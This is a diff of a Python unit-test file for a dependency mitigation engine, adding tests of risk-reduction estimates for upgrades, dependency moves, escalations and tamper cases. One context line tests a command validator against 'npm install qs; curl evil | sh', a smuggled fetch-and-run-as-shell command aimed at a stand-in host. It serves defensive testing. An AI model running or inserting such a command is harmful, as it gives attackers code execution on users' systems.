@@ -128,6 +128,31 @@ class CandidateTests(unittest.TestCase):
         self.assertFalse(is_safe_command("npm install qs; curl evil | sh"))
 
 
+class ExpectedRiskTests(unittest.TestCase):
+    def test_upgrade_estimates_follow_fix_ranges(self) -> None:
+        from mitigation_engine import estimate_risk_reduction
+        pkg = build(osv_fixed_versions=["6.5.3", "6.14.0"], required_fixed_version="6.14.0")
+        estimate_risk_reduction(pkg, [("GHSA-a", "6.5.3", 65), ("GHSA-b", "6.14.0", 44)], primary_advisory="GHSA-a")
+        by = {c.target_version_or_ref: c for c in pkg.candidates}
+        self.assertEqual((by["6.14.0"].expected_risk_before, by["6.14.0"].expected_risk_after), (65, 0))
+        self.assertEqual(by["6.14.0"].expected_resolved, ["GHSA-a", "GHSA-b"])
+        self.assertEqual(by["6.5.3"].expected_risk_after, 44)            # partial fix leaves GHSA-b
+        self.assertIn("estimate", by["6.5.3"].expected_note)
+
+    def test_other_actions(self) -> None:
+        from mitigation_engine import estimate_risk_reduction
+        moved = build(osv_fixed_versions=["7.0.0"], required_fixed_version="7.0.0", test_only_usage=True)
+        estimate_risk_reduction(moved, [("GHSA-a", "7.0.0", 60)])
+        mv = next(c for c in moved.candidates if c.action_type == MitigationAction.MOVE_DEPENDENCY)
+        self.assertEqual(mv.expected_risk_after, 36)                     # dev/test discount only
+        esc = build()
+        estimate_risk_reduction(esc, [("GHSA-a", None, 65)])
+        self.assertEqual(esc.candidates[0].expected_risk_after, 65)      # escalation changes nothing
+        tamper = build(anomaly_type="tamper")
+        estimate_risk_reduction(tamper, [("LOCK-001", None, 100)])
+        self.assertEqual(tamper.candidates[0].expected_risk_after, 0)
+
+
 class DecisionTests(unittest.TestCase):
     def setUp(self) -> None:
         self.pkg = build(package_name="jsonwebtoken", current_version="0.4.0", osv_fixed_versions=["4.2.2", "9.0.0"],
